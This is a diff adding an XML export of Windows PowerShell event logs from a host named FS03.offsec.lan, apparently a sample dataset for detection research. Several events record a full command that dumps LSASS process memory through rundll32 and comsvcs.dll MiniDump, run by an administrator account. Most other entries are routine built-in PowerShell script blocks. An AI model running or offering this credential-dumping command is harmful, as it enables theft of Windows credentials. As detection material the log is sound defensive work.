@@ -1,0 +1,1843 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">600</EventID>
+      <Level>4</Level>
+      <Task>6</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>126</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>Alias</Data>
+      <Data>Started</Data>
+      <Data>	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">600</EventID>
+      <Level>4</Level>
+      <Task>6</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>127</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>Environment</Data>
+      <Data>Started</Data>
+      <Data>	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">600</EventID>
+      <Level>4</Level>
+      <Task>6</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>128</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>FileSystem</Data>
+      <Data>Started</Data>
+      <Data>	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">600</EventID>
+      <Level>4</Level>
+      <Task>6</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>129</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>Function</Data>
+      <Data>Started</Data>
+      <Data>	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">600</EventID>
+      <Level>4</Level>
+      <Task>6</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>130</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>Registry</Data>
+      <Data>Started</Data>
+      <Data>	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">600</EventID>
+      <Level>4</Level>
+      <Task>6</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>131</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>Variable</Data>
+      <Data>Started</Data>
+      <Data>	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">400</EventID>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>132</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>Available</Data>
+      <Data>None</Data>
+      <Data>	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=4.0
+	RunspaceId=1668d864-c13c-442c-bf70-3fe6a4dee2ca
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">800</EventID>
+      <Level>4</Level>
+      <Task>8</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>133</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id</Data>
+      <Data>	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=15
+
+	UserId=OFFSEC\admmig
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=4.0
+	RunspaceId=1668d864-c13c-442c-bf70-3fe6a4dee2ca
+	PipelineId=1
+	ScriptName=
+	CommandLine=C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id</Data>
+      <Data>CommandInvocation(Get-Process): "Get-Process"
+ParameterBinding(Get-Process): name="Name"; value="lsass"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShell" />
+      <EventID Qualifiers="0">800</EventID>
+      <Level>4</Level>
+      <Task>8</Task>
+      <Keywords>0x80000000000000</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.000000000Z" />
+      <EventRecordID>134</EventRecordID>
+      <Channel>Windows PowerShell</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data>C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id</Data>
+      <Data>	DetailSequence=1
+	DetailTotal=1
+
+	SequenceNumber=17
+
+	UserId=OFFSEC\admmig
+	HostName=ConsoleHost
+	HostVersion=4.0
+	HostId=63c2be9c-cd2c-46d7-ac07-01a9e98f2400
+	HostApplication=powershell.exe -NoP -C C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id
+	EngineVersion=4.0
+	RunspaceId=1668d864-c13c-442c-bf70-3fe6a4dee2ca
+	PipelineId=1
+	ScriptName=
+	CommandLine=C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\vtnr8kff.dmp full;Wait-Process -Id (Get-Process rundll32).id</Data>
+      <Data>CommandInvocation(Get-Process): "Get-Process"
+ParameterBinding(Get-Process): name="Name"; value="rundll32"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>40961</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>1</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.224590300Z" />
+      <EventRecordID>1285</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.224590300Z" />
+      <EventRecordID>1286</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">"PS $($executionContext.SessionState.Path.CurrentLocation)$('&gt;' * ($nestedPromptLevel + 1)) "
+# .Link
+# http://go.microsoft.com/fwlink/?LinkID=225750
+# .ExternalHelp System.Management.Automation.dll-help.xml
+</Data>
+      <Data Name="ScriptBlockId">f61a7fd0-2926-4ac5-bcd6-c6c3e886f23c</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.240215300Z" />
+      <EventRecordID>1287</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">
+&lt;# Options include:
+     RelativeFilePaths - [bool]
+         Always resolve file paths using Resolve-Path -Relative.
+         The default is to use some heuristics to guess if relative or absolute is better.
+
+   To customize your own custom options, pass a hashtable to CompleteInput, e.g.
+         return [System.Management.Automation.CommandCompletion]::CompleteInput($inputScript, $cursorColumn,
+             @{ RelativeFilePaths=$false }
+#&gt;
+
+[CmdletBinding(DefaultParameterSetName = 'ScriptInputSet')]
+Param(
+    [Parameter(ParameterSetName = 'ScriptInputSet', Mandatory = $true, Position = 0)]
+    [string] $inputScript,
+    
+    [Parameter(ParameterSetName = 'ScriptInputSet', Mandatory = $true, Position = 1)]
+    [int] $cursorColumn,
+
+    [Parameter(ParameterSetName = 'AstInputSet', Mandatory = $true, Position = 0)]
+    [System.Management.Automation.Language.Ast] $ast,
+
+    [Parameter(ParameterSetName = 'AstInputSet', Mandatory = $true, Position = 1)]
+    [System.Management.Automation.Language.Token[]] $tokens,
+
+    [Parameter(ParameterSetName = 'AstInputSet', Mandatory = $true, Position = 2)]
+    [System.Management.Automation.Language.IScriptPosition] $positionOfCursor,
+    
+    [Parameter(ParameterSetName = 'ScriptInputSet', Position = 2)]
+    [Parameter(ParameterSetName = 'AstInputSet', Position = 3)]
+    [Hashtable] $options = $null
+)
+
+End
+{
+    if ($psCmdlet.ParameterSetName -eq 'ScriptInputSet')
+    {
+        return [System.Management.Automation.CommandCompletion]::CompleteInput(
+            &lt;#inputScript#&gt;  $inputScript,
+            &lt;#cursorColumn#&gt; $cursorColumn,
+            &lt;#options#&gt;      $options)
+    }
+    else
+    {
+        return [System.Management.Automation.CommandCompletion]::CompleteInput(
+            &lt;#ast#&gt;              $ast,
+            &lt;#tokens#&gt;           $tokens,
+            &lt;#positionOfCursor#&gt; $positionOfCursor,
+            &lt;#options#&gt;          $options)
+    }
+}
+        </Data>
+      <Data Name="ScriptBlockId">66868ed0-c888-425b-94c3-df6c50632d81</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.240215300Z" />
+      <EventRecordID>1288</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">$space = New-Object System.Management.Automation.Host.BufferCell
+$space.Character = ' '
+$space.ForegroundColor = $host.ui.rawui.ForegroundColor
+$space.BackgroundColor = $host.ui.rawui.BackgroundColor
+$rect = New-Object System.Management.Automation.Host.Rectangle
+$rect.Top = $rect.Bottom = $rect.Right = $rect.Left = -1
+$origin = New-Object System.Management.Automation.Host.Coordinates
+$Host.UI.RawUI.CursorPosition = $origin
+$Host.UI.RawUI.SetBufferContents($rect, $space)
+# .Link
+# http://go.microsoft.com/fwlink/?LinkID=225747
+# .ExternalHelp System.Management.Automation.dll-help.xml
+</Data>
+      <Data Name="ScriptBlockId">348ad715-185a-49c1-9122-a75725a8282e</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.240215300Z" />
+      <EventRecordID>1289</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">param([string[]]$paths)
+
+$OutputEncoding = [System.Console]::OutputEncoding
+
+if($paths)
+{
+    foreach ($file in $paths)
+    {
+        Get-Content $file | more.com
+    }
+}
+else
+{
+    $input | more.com
+}
+</Data>
+      <Data Name="ScriptBlockId">d178e9eb-ea8d-43fe-97f5-bf3c74a028dd</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1290</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">
+&lt;#
+.FORWARDHELPTARGETNAME Get-Help
+.FORWARDHELPCATEGORY Cmdlet
+#&gt;
+[CmdletBinding(DefaultParameterSetName='AllUsersView', HelpUri='http://go.microsoft.com/fwlink/?LinkID=113316')]
+param(
+    [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)]
+    [string]
+    ${Name},
+
+    [string]
+    ${Path},
+
+    [ValidateSet('Alias','Cmdlet','Provider','General','FAQ','Glossary','HelpFile','ScriptCommand','Function','Filter','ExternalScript','All','DefaultHelp','Workflow')]
+    [string[]]
+    ${Category},
+
+    [string[]]
+    ${Component},
+
+    [string[]]
+    ${Functionality},
+
+    [string[]]
+    ${Role},
+
+    [Parameter(ParameterSetName='DetailedView', Mandatory=$true)]
+    [switch]
+    ${Detailed},
+
+    [Parameter(ParameterSetName='AllUsersView')]
+    [switch]
+    ${Full},
+
+    [Parameter(ParameterSetName='Examples', Mandatory=$true)]
+    [switch]
+    ${Examples},
+
+    [Parameter(ParameterSetName='Parameters', Mandatory=$true)]
+    [string]
+    ${Parameter},
+
+    [Parameter(ParameterSetName='Online', Mandatory=$true)]
+    [switch]
+    ${Online},
+
+    [Parameter(ParameterSetName='ShowWindow', Mandatory=$true)]
+    [switch]
+    ${ShowWindow})
+
+      #Set the outputencoding to Console::OutputEncoding. More.com doesn't work well with Unicode.
+      $outputEncoding=[System.Console]::OutputEncoding
+
+      Get-Help @PSBoundParameters | more
+</Data>
+      <Data Name="ScriptBlockId">d5252597-b584-43d6-83da-069e7c04687f</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1291</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">
+&lt;#
+.FORWARDHELPTARGETNAME New-Item
+.FORWARDHELPCATEGORY Cmdlet
+#&gt;
+[CmdletBinding(DefaultParameterSetName='pathSet',
+    SupportsShouldProcess=$true,
+    SupportsTransactions=$true,
+    ConfirmImpact='Medium')]
+    [OutputType([System.IO.DirectoryInfo])]
+param(
+    [Parameter(ParameterSetName='nameSet', Position=0, ValueFromPipelineByPropertyName=$true)]
+    [Parameter(ParameterSetName='pathSet', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
+    [System.String[]]
+    ${Path},
+
+    [Parameter(ParameterSetName='nameSet', Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
+    [AllowNull()]
+    [AllowEmptyString()]
+    [System.String]
+    ${Name},
+
+    [Parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
+    [System.Object]
+    ${Value},
+
+    [Switch]
+    ${Force},
+
+    [Parameter(ValueFromPipelineByPropertyName=$true)]
+    [System.Management.Automation.PSCredential]
+    ${Credential}
+)
+
+begin {
+
+    try {
+        $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('New-Item', [System.Management.Automation.CommandTypes]::Cmdlet)
+        $scriptCmd = {&amp; $wrappedCmd -Type Directory @PSBoundParameters }
+        $steppablePipeline = $scriptCmd.GetSteppablePipeline()
+        $steppablePipeline.Begin($PSCmdlet)
+    } catch {
+        throw
+    }
+
+}
+
+process {
+
+    try {
+        $steppablePipeline.Process($_)
+    } catch {
+        throw
+    }
+
+}
+
+end {
+
+    try {
+        $steppablePipeline.End()
+    } catch {
+        throw
+    }
+
+}
+
+</Data>
+      <Data Name="ScriptBlockId">224e56f3-14a2-4d10-9982-81d0d14a3851</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1292</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">
+param(
+    [Parameter(ValueFromPipeline=$true)]
+    [string[]]
+    $verb = '*'
+)
+begin {
+    $allVerbs = [PSObject].Assembly.GetTypes() |
+        Where-Object {$_.Name -match '^Verbs.'} |
+        Get-Member -type Properties -static |
+        Select-Object @{
+            Name='Verb'
+            Expression = {$_.Name}
+        }, @{
+            Name='Group'
+            Expression = {
+                $str = "$($_.TypeName)"
+                $str.Substring($str.LastIndexOf('Verbs') + 5)
+            }
+        }
+}
+process {
+    foreach ($v in $verb) {
+        $allVerbs | Where-Object { $_.Verb -like $v }
+    }
+}
+# .Link
+# http://go.microsoft.com/fwlink/?LinkID=160712
+# .ExternalHelp System.Management.Automation.dll-help.xml
+</Data>
+      <Data Name="ScriptBlockId">78bfcb10-c68f-466a-8f92-8fa4504f4a1b</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1293</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">
+[CmdletBinding()]
+param(
+    [ValidateRange(2, 2147483647)]
+    [int]
+    ${Width},
+
+    [Parameter(ValueFromPipeline=$true)]
+    [psobject]
+    ${InputObject})
+
+begin
+{
+    try {
+        $PSBoundParameters['Stream'] = $true
+        $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Out-String',[System.Management.Automation.CommandTypes]::Cmdlet)
+        $scriptCmd = {&amp; $wrappedCmd @PSBoundParameters }
+        $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)
+        $steppablePipeline.Begin($PSCmdlet)
+    } catch {
+        throw
+    }
+}
+
+process
+{
+    try {
+        $steppablePipeline.Process($_)
+    } catch {
+        throw
+    }
+}
+
+end
+{
+    try {
+        $steppablePipeline.End()
+    } catch {
+        throw
+    }
+}
+&lt;#
+.ForwardHelpTargetName Out-String
+.ForwardHelpCategory Cmdlet
+#&gt;
+</Data>
+      <Data Name="ScriptBlockId">ed0d1dfc-abc8-443c-bb7a-d04089c79523</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>102</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2021-10-20T14:39:26.255841200Z" />
+      <EventRecordID>1294</EventRecordID>
+      <Correlation ActivityID="{a674bae4-bf55-0000-76f7-84a655bfd701}" />
+      <Execution ProcessID="3268" ThreadID="3532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>FS03.offsec.lan</Computer>
+      <Security UserID="S-1-5-21-4230534742-2542757381-3142984815-1111" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">Set-Location A:</Data>
